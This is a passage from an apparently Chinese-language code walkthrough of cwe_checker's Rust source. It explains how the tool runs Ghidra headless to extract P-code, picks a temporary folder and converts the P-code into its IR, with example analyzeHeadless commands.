class-name">Raw</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">from_str</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>saved_pcode_raw<span class="token punctuation">)</span><span class="token operator">?</span>     <span class="token comment">// 解析 JSON 为 PcodeProject</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 没有指定 pcode 则调用 ghidra 生成</span>        <span class="token keyword">let</span> tmp_folder <span class="token operator">=</span> <span class="token function">get_tmp_folder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span> <span class="token comment">// 获取临时文件夹</span>        <span class="token comment">// 为文件名添加时间戳后缀，以便多个 cwe_checker 实例并行运行同一文件时互不干扰</span>        <span class="token keyword">let</span> timestamp_suffix <span class="token operator">=</span> <span class="token macro property">format!</span><span class="token punctuation">(</span>            <span class="token string">"&#123;:?&#125;"</span><span class="token punctuation">,</span>            <span class="token namespace">std<span class="token punctuation">::</span>time<span class="token punctuation">::</span></span><span class="token class-name">SystemTime</span><span class="token punctuation">::</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">duration_since</span><span class="token punctuation">(</span><span class="token namespace">std<span class="token punctuation">::</span>time<span class="token punctuation">::</span></span><span class="token class-name">SystemTime</span><span class="token punctuation">::</span><span class="token constant">UNIX_EPOCH</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">as_millis</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 为管道创建唯一名称</span>        <span class="token keyword">let</span> fifo_path <span class="token operator">=</span> tmp_folder<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"pcode_&#123;timestamp_suffix&#125;.pipe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> ghidra_command <span class="token operator">=</span> <span class="token function">generate_ghidra_call_command</span><span class="token punctuation">(</span> <span class="token comment">// 生成调用 Ghidra 的命令</span>            file_path<span class="token punctuation">,</span>            <span class="token operator">&amp;</span>fifo_path<span class="token punctuation">,</span>            <span class="token operator">&amp;</span>timestamp_suffix<span class="token punctuation">,</span>            <span class="token operator">&amp;</span>bare_metal_config_opt<span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>        <span class="token function">execute_ghidra</span><span class="token punctuation">(</span>ghidra_command<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fifo_path<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token operator">?</span> <span class="token comment">// 执行 Ghidra 并获取结果</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        debug_settings<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span> <span class="token comment">// 打印解析后的 Pcode</span>        <span class="token operator">&amp;</span>pcode_project<span class="token punctuation">,</span>        <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token class-name">Pcode</span><span class="token punctuation">(</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">PcodeForm</span><span class="token punctuation">::</span><span class="token class-name">Parsed</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_pcode_project_to_ir_project</span><span class="token punctuation">(</span> <span class="token comment">// 将 Pcode 项目解析为 IR 项目</span>        pcode_project<span class="token punctuation">,</span>        binary<span class="token punctuation">,</span>        <span class="token operator">&amp;</span>bare_metal_config_opt<span class="token punctuation">,</span>        debug_settings<span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="generate-ghidra-call-command-生成调用-ghidra-的命令"><a href="#generate-ghidra-call-command-生成调用-ghidra-的命令" class="headerlink" title="generate_ghidra_call_command 生成调用 ghidra 的命令"></a>generate_ghidra_call_command 生成调用 ghidra 的命令</h4><ul><li><p>从 ghidra.json 配置文件读取 ghidra 路径，获取 Pcode 插件路径</p></li><li><p>获取临时文件夹，优先使用系统运行时的 cwe_checker 目录，如果不存在则创建 &#x2F;tmp&#x2F;cwe_checker 目录</p></li><li><p>从二进制文件路径提取二进制文件的文件名</p></li><li><p>创建 ghidra 命令对象并设置命令参数，如果提供了 bare_metal_config 则进行额外设置</p><ul><li><p>无 bare_metal_config：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>ghidra_path<span class="token operator">></span>/support/analyzeHeadless <span class="token operator">&lt;</span>tmp_folder<span class="token operator">></span> <span class="token string">"PcodeExtractor_&lt;filename>_&lt;timestamp>"</span> <span class="token parameter variable">-import</span> <span class="token operator">&lt;</span>file_path<span class="token operator">></span> <span class="token parameter variable">-postScript</span> <span class="token operator">&lt;</span>ghidra_plugin_path<span class="token operator">></span>/PcodeExtractor.java <span class="token operator">&lt;</span>fifo_path<span class="token operator">></span> <span class="token parameter variable">-scriptPath</span> <span class="token operator">&lt;</span>ghidra_plugin_path<span class="token operator">></span> <span class="token parameter variable">-deleteProject</span> <span class="token parameter variable">-analysisTimeoutPerFile</span> <span class="token number">3600</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/opt/ghidra/support/analyzeHeadless /tmp/cwe_checker <span class="token string">"PcodeExtractor_test_program_1234567890"</span> <span class="token parameter variable">-import</span> /home/user/binary <span class="token parameter variable">-postScript</span> /usr/local/lib/cwe_checker/ghidra_plugin/PcodeExtractor.java /tmp/cwe_checker/pcode_1234567890.pipe <span class="token parameter variable">-scriptPath</span> /usr/local/lib/cwe_checker/ghidra_plugin <span class="token parameter variable">-deleteProject</span> <span class="token parameter variable">-analysisTimeoutPerFile</span> <span class="token number">3600</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>有 bare_metal_config：其中 -loader-baseAddr 地址不包含 0x，输入值含有 0x 的时候会自动去除</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>ghidra_path<span class="token operator">></span>/support/analyzeHeadless <span class="token operator">&lt;</span>tmp_folder<span class="token operator">></span> <span class="token string">"PcodeExtractor_&lt;filename>_&lt;timestamp>"</span> <span class="token parameter variable">-import</span> <span class="token operator">&lt;</span>file_path<span class="token operator">></span> <span class="token parameter variable">-postScript</span> <span class="token operator">&lt;</span>ghidra_plugin_path<span class="token operator">></span>/PcodeExtractor.java <span class="token operator">&lt;</span>fifo_path<span class="token operator">></span> <span class="token parameter variable">-scriptPath</span> <span class="token operator">&lt;</span>ghidra_plugin_path<span class="token operator">></span> <span class="token parameter variable">-deleteProject</span> <span class="token parameter variable">-analysisTimeoutPerFile</span> <span class="token number">3600</span> <span class="token parameter variable">-loader</span> BinaryLoader -loader-baseAddr <span class="token operator">&lt;</span>base_address<span class="token operator">></span> <span class="token parameter variable">-processor</span> <span class="token operator">&lt;</span>processor_id<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/opt/ghidra/support/analyzeHeadless /tmp/cwe_checker <span class="token string">"PcodeExtractor_firmware.bin_1234567890"</span> <span class="token parameter variable">-import</span> /home/user/firmware.bin <span class="token parameter variable">-postScript</span> /usr/local/lib/cwe_checker/ghidra_plugin/PcodeExtractor.java /tmp/cwe_checker/pcode_1234567890.pipe <span class="token parameter variable">-scriptPath</span> /usr/local/lib/cwe_checker/ghidra_plugin <span class="token parameter variable">-deleteProject</span> <span class="token parameter variable">-analysisTimeoutPerFile</span> <span class="token number">3600</span> <span class="token parameter variable">-loader</span> BinaryLoader -loader-baseAddr <span class="token number">8000000</span> <span class="token parameter variable">-processor</span> ARM:LE:32:Cortex<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>返回 ghidra 命令对象</p></li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 生成用于调用 Ghidra 并在其中执行 P-Code-Extractor 插件的命令</span><span class="token keyword">fn</span> <span class="token function-definition function">generate_ghidra_call_command</span><span class="token punctuation">(</span>    file_path<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Path</span><span class="token punctuation">,</span> <span class="token comment">// 二进制文件路径</span>    fifo_path<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Path</span><span class="token punctuation">,</span> <span class="token comment">// FIFO 命名管道路径</span>    timestamp_suffix<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> <span class="token comment">// 时间戳后缀（用于创建唯一的项目名称）</span>    bare_metal_config_opt<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">BareMetalConfig</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 可选的裸机配置</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">Command</span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 从配置文件中读取 Ghidra 路径</span>    <span class="token keyword">let</span> ghidra_path<span class="token punctuation">:</span> <span class="token namespace">std<span class="token punctuation">::</span>path<span class="token punctuation">::</span></span><span class="token class-name">PathBuf</span> <span class="token operator">=</span>        <span class="token namespace">serde_json<span class="token punctuation">::</span></span><span class="token function">from_value</span><span class="token punctuation">(</span><span class="token function">read_config_file</span><span class="token punctuation">(</span><span class="token string">"ghidra.json"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token string">"ghidra_path"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token string">"Path to Ghidra not configured."</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> headless_path <span class="token operator">=</span> ghidra_path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"support/analyzeHeadless"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Ghidra 无头模式可执行文件路径</span>    <span class="token keyword">let</span> tmp_folder <span class="token operator">=</span> <span class="token function">get_tmp_folder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span> <span class="token comment">// 获取临时文件夹</span>    <span class="token comment">// 从文件路径中提取文件名</span>    <span class="token keyword">let</span> filename <span class="token operator">=</span> file_path        <span class="token punctuation">.</span><span class="token function">file_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">ok_or_else</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span><span class="token closure-punctuation punctuation">|</span></span> <span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"Invalid file name"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span>        <span class="token punctuation">.</span><span class="token function">to_string_lossy</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> ghidra_plugin_path <span class="token operator">=</span> <span class="token function">get_ghidra_plugin_path</span><span class="token punctuation">(</span><span class="token string">"p_code_extractor"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span> <span class="token comment">// 获取 Pcode 提取器插件路径</span>    <span class="token comment">// 创建 Ghidra 命令对象</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> ghidra_command <span class="token operator">=</span> <span class="token class-name">Command</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>headless_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    ghidra_command        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp_folder<span class="token punctuation">)</span> <span class="token comment">// 存储临时文件的文件夹</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"PcodeExtractor_&#123;filename&#125;_&#123;timestamp_suffix&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 临时 Ghidra 项目的名称</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-import"</span><span class="token punctuation">)</span> <span class="token comment">// 将文件导入到 Ghidra 项目中</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span> <span class="token comment">// 文件导入路径</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-postScript"</span><span class="token punctuation">)</span> <span class="token comment">// 在 Ghidra 完成标准分析后执行脚本</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span>ghidra_plugin_path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"PcodeExtractor.java"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// PcodeExtractor.java 的路径</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span>fifo_path<span class="token punctuation">)</span> <span class="token comment">// 命名管道（fifo）的路径</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-scriptPath"</span><span class="token punctuation">)</span> <span class="token comment">// 将包含其他脚本文件的文件夹添加到 Ghidra 脚本文件搜索路径</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span>ghidra_plugin_path<span class="token punctuation">)</span> <span class="token comment">// 包含 PcodeExtractor.java 的文件夹路径（以便找到其他 Java 文件）</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-deleteProject"</span><span class="token punctuation">)</span> <span class="token comment">// 脚本完成后删除临时项目</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-analysisTimeoutPerFile"</span><span class="token punctuation">)</span> <span class="token comment">// 设置标准分析在终止前可以运行多长时间的超时</span>        <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"3600"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 超时时间为一小时（=3600秒）// TODO: 后置脚本可以检测到超时触发并相应处理</span>    <span class="token comment">// 如果提供了裸机配置，添加额外的命令参数</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>bare_metal_config<span class="token punctuation">)</span> <span class="token operator">=</span> bare_metal_config_opt <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> base_address<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>bare_metal_config<span class="token punctuation">.</span>flash_base_address<span class="token punctuation">;</span> <span class="token comment">// 获取基础地址字符串</span>        <span class="token comment">// 如果地址以 "0x" 开头，去掉前缀</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>stripped_address<span class="token punctuation">)</span> <span class="token operator">=</span> base_address<span class="token punctuation">.</span><span class="token function">strip_prefix</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            base_address <span class="token operator">=</span> stripped_address<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ghidra_command            <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-loader"</span><span class="token punctuation">)</span> <span class="token comment">// 告诉 Ghidra 使用特定的加载器</span>            <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"BinaryLoader"</span><span class="token punctuation">)</span> <span class="token comment">// 对裸机二进制文件使用 BinaryLoader</span>            <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-loader-baseAddr"</span><span class="token punctuation">)</span> <span class="token comment">// 提供二进制文件应映射到内存中的基础地址</span>            <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span>base_address<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span><span class="token string">"-processor"</span><span class="token punctuation">)</span> <span class="token comment">// 提供处理器类型 ID，该二进制文件是为该处理器编译的</span>            <span class="token punctuation">.</span><span class="token function">arg</span><span class="token punctuation">(</span>bare_metal_config<span class="token punctuation">.</span>processor_id<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span>ghidra_command<span class="token punctuation">)</span> <span class="token comment">// 返回配置好的命令</span><span class="token punctuation">&#125;</span><span class="token comment">/// 获取程序应存储临时文件的文件夹</span><span class="token keyword">fn</span> <span class="token function-definition function">get_tmp_folder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">PathBuf</span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 获取 cwe_checker 的项目目录路径</span>    <span class="token keyword">let</span> project_dirs <span class="token operator">=</span> <span class="token class-name">ProjectDirs</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"cwe_checker"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token string">"Could not determine path for temporary files"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token comment">// 优先使用运行时目录，如果不存在则使用默认的 /tmp/cwe_checker</span>    <span class="token keyword">let</span> tmp_folder <span class="token operator">=</span> <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>folder<span class="token punctuation">)</span> <span class="token operator">=</span> project_dirs<span class="token punctuation">.</span><span class="token function">runtime_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        folder <span class="token comment">// 使用系统运行时目录（如 Linux 的 /run/user/xxx/cwe_checker）</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Path</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token string">"/tmp/cwe_checker"</span><span class="token punctuation">)</span> <span class="token comment">// 回退到 /tmp/cwe_checker</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token comment">// 如果临时文件夹不存在，创建它</span>    <span class="token keyword">if</span> <span class="token operator">!</span>tmp_folder<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token function">create_dir</span><span class="token punctuation">(</span>tmp_folder<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">context</span><span class="token punctuation">(</span><span class="token string">"Unable to create temporary folder"</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span>tmp_folder<span class="token punctuation">.</span><span class="token function">to_path_buf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 返回临时文件夹路径</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="parse-pcode-project-to-ir-project-将-Pcode-项目解析为-IR-项目"><a href="#parse-pcode-project-to-ir-project-将-Pcode-项目解析为-IR-项目" class="headerlink" title="parse_pcode_project_to_ir_project 将 Pcode 项目解析为 IR 项目"></a>parse_pcode_project_to_ir_project 将 Pcode 项目解析为 IR 项目</h4><ul><li>指定了 bare_metal_config 则获取其中的基址</li><li>从二进制文件中获取到基址后调用 <a href="###src%5Ccwe_checker_lib%5Csrc%5Cghidra_pcode%5Cmod.rs">pcode_project.into_ir_project</a> 转换为 project 结构体</li><li>获取基址失败，则尝试从 bare_metal_config 获取基址，并且设置偏移量为 0</li><li>找不到基址，则设置 0 为默认值</li><li>返回 project 结构体</li></ul><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">parse_pcode_project_to_ir_project</span><span class="token punctuation">(</span>    pcode_project<span class="token punctuation">:</span> <span class="token class-name">PcodeProject</span><span class="token punctuation">,</span> <span class="token comment">// Ghidra 的 Pcode 项目</span>    binary<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token punctuation">[</span><span class="token keyword">u8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token comment">// 二进制文件内容</span>    bare_metal_config_opt<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">BareMetalConfig</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// 可选的裸机配置</span>    debug_settings<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Settings</span><span class="token punctuation">,</span> <span class="token comment">// 调试设置</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">WithLogs</span><span class="token operator">&lt;</span><span class="token class-name">Project</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果提供了裸机配置，解析其基础地址</span>    <span class="token keyword">let</span> bare_metal_base_address_opt <span class="token operator">=</span> bare_metal_config_opt        <span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>config<span class="token closure-punctuation punctuation">|</span></span> config<span class="token punctuation">.</span><span class="token function">parse_binary_base_address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> project<span class="token punctuation">:</span> <span class="token class-name">WithLogs</span><span class="token operator">&lt;</span><span class="token class-name">Project</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token keyword">match</span> <span class="token class-name">RuntimeMemoryImage</span><span class="token punctuation">::</span><span class="token function">get_base_address</span><span class="token punctuation">(</span>binary<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span>binary_base_address<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 成功获取二进制文件基础地址，使用该地址转换项目</span>            pcode_project<span class="token punctuation">.</span><span class="token function">into_ir_project</span><span class="token punctuation">(</span>binary_base_address<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Err</span><span class="token punctuation">(</span>_err<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 无法从二进制文件获取基础地址</span>            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>binary_base_address<span class="token punctuation">)</span> <span class="token operator">=</span> bare_metal_base_address_opt <span class="token punctuation">&#123;</span>                <span class="token comment">// 如果有裸机配置提供的基础地址，使用它</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> project <span class="token operator">=</span>                    pcode_project<span class="token punctuation">.</span><span class="token function">into_ir_project</span><span class="token punctuation">(</span>binary_base_address<span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 对于裸机二进制，将地址偏移量设为 0</span>                project<span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">.</span>address_base_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                project            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 没有基础地址，使用 0 作为默认值</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> project <span class="token operator">=</span> pcode_project<span class="token punctuation">.</span><span class="token function">into_ir_project</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> debug_settings<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 添加日志消息，说明使用了回退方案</span>                project<span class="token punctuation">.</span><span class="token function">add_log_msg</span><span class="token punctuation">(</span><span class="token class-name">LogMessage</span><span class="token punctuation">::</span><span class="token function">new_info</span><span class="token punctuation">(</span><span class="token string">"Could not determine binary base address. Using base address of Ghidra output as fallback."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                project<span class="token punctuation">.</span>program<span class="token punctuation">.</span>term<span class="token punctuation">.</span>address_base_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                project            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">Ok</span><span class="token punctuation">(</span>project<span class="token punctuation">)</span> <span class="token comment">// 返回解析后的项目</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="src-cwe-checker-lib-src-ghidra-pcode-mod-rs"><a href="#src-cwe-checker-lib-src-ghidra-pcode-mod-rs" class="headerlink" title="src\cwe_checker_lib\src\ghidra_pcode\mod.rs"></a>src\cwe_checker_lib\src\ghidra_pcode\mod.rs</h3><h4 id="PcodeProject-into-ir-project-将-PcodeProject-转化成-IR"><a href="#PcodeProject-into-ir-project-将-PcodeProject-转化成-IR" class="headerlink" title="PcodeProject.into_ir_project 将 PcodeProject 转化成 IR"></a>PcodeProject.into_ir_project 将 PcodeProject 转化成 IR</h4><ul><li><p>初始化日志向量，创建寄存器映射表，将程序转化为 IR 函数项的映射表</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> <span class="token keyword">mut</span> logs <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 初始化日志向量，用于收集处理过程中的日志消息</span><span class="token keyword">let</span> register_map <span class="token operator">=</span> <span class="token class-name">RegisterMap</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>register_properties<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建寄存器映射表</span><span class="token comment">// 将程序转换为 IR 函数项的映射表（函数 TID -> 函数项）</span><span class="token keyword">let</span> ir_function_terms_map <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>program<span class="token punctuation">.</span><span class="token function">to_ir_function_terms_map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" 